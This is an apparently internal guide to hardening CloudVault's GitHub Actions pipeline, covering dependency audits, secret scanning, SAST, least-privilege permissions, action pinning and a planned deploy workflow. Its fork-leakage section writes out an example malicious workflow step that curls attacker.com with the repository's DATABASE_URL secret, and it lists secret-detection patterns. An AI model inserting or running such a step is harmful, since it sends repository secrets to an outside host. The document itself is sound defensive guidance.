# CI/CD Pipeline Hardening

## Overview

CloudVault's CI/CD pipeline (**GitHub Actions**) builds, tests, and deploys code. This document establishes security controls to prevent supply chain attacks, secret leakage, and unauthorized deployments.

**Current Pipeline**: `.github/workflows/test-coverage.yml` - Test + coverage only (no deployment)

---

## Current CI/CD Configuration

### Workflow: Test & Coverage (`.github/workflows/test-coverage.yml`)

**Triggers**:

- Push to `main` or `develop` branches
- Pull requests to `main` or `develop`

**Steps**:

1. Checkout code (`actions/checkout@v4`)
2. Setup Node.js 20.x (`actions/setup-node@v4`)
3. Install dependencies (`npm ci`)
4. Type checking (`npm run check`)
5. Run tests with coverage (`npm run test:coverage`)
6. Upload coverage to Codecov
7. Upload coverage artifacts (30-day retention)

**Security Properties**:

- ✅ Uses `npm ci` (lockfile enforcement)
- ✅ Type checking prevents TypeScript errors
- ✅ 100% test coverage gate (documented exception for uncovered code)
- ⚠️ No security scanning (SAST, secret detection, dependency audit)

---

## Security Gaps in Current Pipeline

| Gap                       | Risk                               | Priority   |
| ------------------------- | ---------------------------------- | ---------- |
| No `npm audit`            | Vulnerable dependencies deployed   | **HIGH**   |
| No secret scanning        | Hardcoded credentials committed    | **HIGH**   |
| No SAST (static analysis) | Code vulnerabilities undetected    | **MEDIUM** |
| Broad permissions         | Workflow can write to repo         | **MEDIUM** |
| No deployment workflow    | Manual deployment (no audit trail) | **LOW**    |

---

## Recommended Security Gates

### 1. Dependency Vulnerability Scanning

**Add to workflow**:

```yaml
- name: Audit dependencies
  run: npm audit --production --audit-level=moderate
  continue-on-error: false
```

**Purpose**: Block PRs with known vulnerable dependencies

**Severity Threshold**:

- `moderate`: Recommended (balance security vs. false positives)
- `high`: Only critical vulnerabilities (may miss exploitable bugs)

**Alternative**: Snyk or Socket.dev (more comprehensive)

```yaml
- name: Snyk security scan
  uses: snyk/actions/node@master
  env:
    SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

---

### 2. Secret Scanning

**Tool**: [Gitleaks](https://github.com/gitleaks/gitleaks)

**Add to workflow**:

```yaml
- name: Detect secrets
  uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Detected Patterns**:

- AWS keys (`AKIA...`)
- Private keys (`-----BEGIN RSA PRIVATE KEY-----`)
- Generic secrets (`password = "..."`, `SECRET_KEY = "..."`)
- High entropy strings (base64-encoded secrets)

**Current Gap**: No pre-commit hook or CI gate (secrets can be committed)

---

### 3. Static Application Security Testing (SAST)

**Tool Options**:

**Option A: CodeQL (GitHub native)**

```yaml
- name: Initialize CodeQL
  uses: github/codeql-action/init@v2
  with:
    languages: javascript, typescript

- name: Build
  run: npm run build

- name: Perform CodeQL Analysis
  uses: github/codeql-action/analyze@v2
```

**Option B: Semgrep (faster, open-source)**

```yaml
- name: Run Semgrep
  uses: returntocorp/semgrep-action@v1
  with:
    config: >-
      p/security-audit
      p/javascript
      p/typescript
```

**Detects**:

- SQL injection patterns (parameterization missing)
- XSS vulnerabilities (`dangerouslySetInnerHTML`)
- Path traversal (string concatenation in file paths)
- Hardcoded secrets (backup check)

---

### 4. Least Privilege Permissions

**Current Permissions** (implicit `write`):

```yaml
# .github/workflows/test-coverage.yml
# No explicit permissions: block - defaults to read-write
```

**Recommended** (principle of least privilege):

```yaml
permissions:
  contents: read # Read source code
  pull-requests: write # Comment on PRs
  statuses: write # Update commit status
```

**Rationale**:

- Prevents workflow from modifying code (supply chain attack mitigation)
- Limits damage if workflow compromised (e.g., via malicious dependency)

**Exception for Release Workflow**:

```yaml
# .github/workflows/release.yml
permissions:
  contents: write # Required to create release
  id-token: write # Required for provenance signing
```

---

### 5. Pull Request Protection

**GitHub Branch Protection Rules** (for `main` branch):

```yaml
# Settings > Branches > Add rule
- Require pull request before merging: ✅
- Require approvals: 1
- Require status checks to pass:
    - ✅ test (TypeScript check + tests)
    - ✅ security-audit (npm audit)
    - ✅ secret-scan (Gitleaks)
- Require conversation resolution before merging: ✅
- Do not allow bypassing the above settings: ✅
```

**Current State**: ⚠️ Branch protection rules not documented (verify in GitHub Settings)

---

## Secret Management in CI/CD

### GitHub Secrets

**Current Secrets** (assumed, verify in repo settings):

- `DATABASE_URL` - PostgreSQL connection string
- `SESSION_SECRET` - Session cookie signing key
- `OIDC_CLIENT_SECRET` - Replit OIDC credentials
- `GCS_SERVICE_ACCOUNT_KEY` - Google Cloud Storage credentials
- `CODECOV_TOKEN` - Codecov upload token (line 38)

**Access Control**:

- ✅ Secrets encrypted at rest (GitHub managed)
- ✅ Secrets only accessible to workflows in same repo
- ⚠️ **MISSING**: Secrets not scoped to specific workflows (all workflows can access)

**Recommended**: Use environment-specific secrets

```yaml
environment:
  name: production
  secrets:
    DATABASE_URL: ${{ secrets.PROD_DATABASE_URL }}
```

---

### Secret Rotation Policy

| Secret                    | Rotation Frequency | Last Rotated | Owner         |
| ------------------------- | ------------------ | ------------ | ------------- |
| `SESSION_SECRET`          | Quarterly          | TBD          | DevOps        |
| `OIDC_CLIENT_SECRET`      | Yearly             | TBD          | Security team |
| `GCS_SERVICE_ACCOUNT_KEY` | Quarterly          | TBD          | DevOps        |
| `CODECOV_TOKEN`           | Yearly             | TBD          | DevOps        |

**Process**: See `12_CRYPTO_POLICY.md` for rotation procedures

---

### Preventing Secret Leakage from Forks

**Threat**: Attacker forks repo, modifies workflow to exfiltrate secrets

**Example Attack**:

```yaml
# Malicious PR to .github/workflows/test-coverage.yml
- name: Steal secrets
  run: curl https://attacker.com/?secret=${{ secrets.DATABASE_URL }}
```

**GitHub Protection**:

- ✅ Secrets not available to fork PRs by default
- ✅ Maintainer approval required for fork workflows

**Configuration** (Settings > Actions > Fork pull request workflows):

```
☑ Require approval for all outside collaborators
```

**Current State**: ✅ Default GitHub protection active (verify in settings)

---

## Build Isolation and Reproducibility

### Runner Environment

**Current**: GitHub-hosted runners (`ubuntu-latest`)

**Security Properties**:

- ✅ Ephemeral VM (destroyed after job)
- ✅ No state persists between runs
- ✅ Isolated network (limited outbound access)

**Trade-offs**:

- ⚠️ `ubuntu-latest` version changes over time (non-reproducible)
- ⚠️ Network access allows data exfiltration

**Hardening**:

```yaml
runs-on: ubuntu-22.04 # Pin specific Ubuntu version
```

---

### Dependency Caching

**Current** (`.github/workflows/test-coverage.yml:25`):

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: ${{ matrix.node-version }}
    cache: 'npm'
```

**Security Properties**:

- ✅ Caches `node_modules` based on `package-lock.json` hash
- ✅ Cache invalidated if lockfile changes
- ⚠️ Cache shared across branches (cache poisoning possible)

**Attack Vector**: Malicious branch poisons cache with backdoored package
**Mitigation**: GitHub uses content-addressable storage (cache key includes lockfile hash)

---

## Deployment Workflow (Future)

### Secure Deployment Pattern

**Workflow**: `.github/workflows/deploy.yml` (not yet implemented)

```yaml
name: Deploy to Production

on:
  push:
    tags:
      - 'v*'

permissions:
  contents: write
  id-token: write

jobs:
  deploy:
    runs-on: ubuntu-22.04
    environment:
      name: production
      url: https://cloudvault.repl.co
    steps:
      - uses: actions/checkout@v4

      - name: Run security checks
        run: |
          npm audit --production --audit-level=moderate
          npx gitleaks detect --verbose --no-git

      - name: Build
        run: npm run build

      - name: Generate SBOM
        run: npx @cyclonedx/cyclonedx-npm --output-file sbom.json

      - name: Deploy to Replit
        env:
          REPLIT_TOKEN: ${{ secrets.REPLIT_DEPLOY_TOKEN }}
        run: |
          # Replit deployment command (TBD based on platform)
          echo "Deploying to Replit..."

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v1
        with:
          files: |
            dist/cloudvault.zip
            sbom.json
```

**Security Controls**:

- ✅ Triggered only by tag push (not every commit)
- ✅ Requires environment approval (manual gate)
- ✅ SBOM generated and published with release
- ✅ Scoped to `production` environment secrets

---

## Monitoring and Alerting

### Workflow Failure Notifications

**Current**: ❌ No failure notifications (relies on email)

**Recommended**: Slack/Discord webhook for failures

```yaml
- name: Notify on failure
  if: failure()
  uses: 8398a7/action-slack@v3
  with:
    status: ${{ job.status }}
    text: 'Security gate failed: npm audit detected vulnerabilities'
    webhook_url: ${{ secrets.SLACK_WEBHOOK }}
```

---

### Audit Log Monitoring

**GitHub Audit Log Events** to monitor:

- Workflow file modifications (`.github/workflows/*.yml`)
- Secret additions/deletions
- Branch protection rule changes
- Deployment approvals

**Access**: Settings > Security > Audit log

**Recommended**: Export audit logs to SIEM (e.g., Splunk, Datadog)

---

## Supply Chain Attack Mitigations

### 1. Pin Action Versions to SHA

**Current** (`.github/workflows/test-coverage.yml`):

```yaml
uses: actions/checkout@v4
uses: actions/setup-node@v4
```

**Problem**: `@v4` resolves to latest minor version (could be compromised)

**Recommended**:

```yaml
uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
```

**Verification**:

```bash
# Get SHA for action version
git ls-remote https://github.com/actions/checkout.git refs/tags/v4.1.1
```

**Tool**: [Dependabot for Actions](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot)

---

### 2. Restrict Workflow Triggers

**Current**:

```yaml
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]
```

**Security Properties**:

- ✅ Only trusted branches trigger workflows
- ✅ PRs from forks require approval (see "Secret Leakage" section)

**Recommended Addition**: Prevent workflow_dispatch (manual trigger)

```yaml
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]
  # workflow_dispatch: {} # Do NOT enable (allows arbitrary execution)
```

---

### 3. Code Review for Workflow Changes

**Policy**: All changes to `.github/workflows/` require security team review

**Enforcement**: CODEOWNERS file

```
# .github/CODEOWNERS
/.github/workflows/ @cloudvault/security-team
```

**Rationale**: Workflow files execute with elevated privileges (access to secrets)

---

## Compliance and Reporting

### SOC 2 Type II Requirements

| Control                             | Requirement               | CloudVault Implementation |
| ----------------------------------- | ------------------------- | ------------------------- |
| **CC6.6** - Logical access controls | Restrict CI/CD access     | ✅ GitHub permissions     |
| **CC7.2** - Detect security events  | Monitor workflow failures | ⚠️ Partial (no SIEM)      |
| **CC8.1** - Authorized changes      | PR approval required      | ✅ Branch protection      |

---

## Implementation Checklist

### Phase 1: Security Gates (Week 1)

- [ ] Add `npm audit` to CI
- [ ] Add Gitleaks secret scanning
- [ ] Configure branch protection rules
- [ ] Document secret rotation schedule

### Phase 2: SAST (Week 2)

- [ ] Enable CodeQL or Semgrep
- [ ] Fix initial SAST findings
- [ ] Add SAST gate to required checks

### Phase 3: Least Privilege (Week 3)

- [ ] Audit current workflow permissions
- [ ] Restrict to least privilege (`contents: read`)
- [ ] Scope secrets to environments

### Phase 4: Deployment (Month 2)

- [ ] Create deployment workflow
- [ ] Add environment approvals
- [ ] Test deployment dry-run

---

## References

- **GitHub Actions Security Hardening**: [Docs](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- **OpenSSF Scorecard**: [Project](https://github.com/ossf/scorecard) - Automated security checks
- **SLSA CI/CD Requirements**: [Link](https://slsa.dev/spec/v1.0/requirements#build-requirements)
- **NIST SP 800-204D**: DevSecOps on CI/CD Pipelines [PDF](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204D.pdf)

---

**Last Updated**: 2025-02-04  
**Next Review**: 2025-05-04
